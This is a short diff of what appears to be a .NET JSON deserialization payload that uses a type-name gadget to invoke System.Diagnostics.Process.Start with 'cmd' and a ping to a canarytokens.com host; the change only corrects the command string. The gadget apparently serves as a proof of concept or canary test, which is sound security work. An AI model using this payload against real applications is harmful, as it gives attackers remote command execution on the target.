@@ -13,7 +13,7 @@
     'MethodName':'Start',
     'MethodParameters':{
         '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-        '$values':['cmd', 'ping -n 3 ping XXXXXXXXX.canarytokens.com']
+        '$values':['cmd', 'ping -n 3   XXXXXXXXX.canarytokens.com']
     },
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }
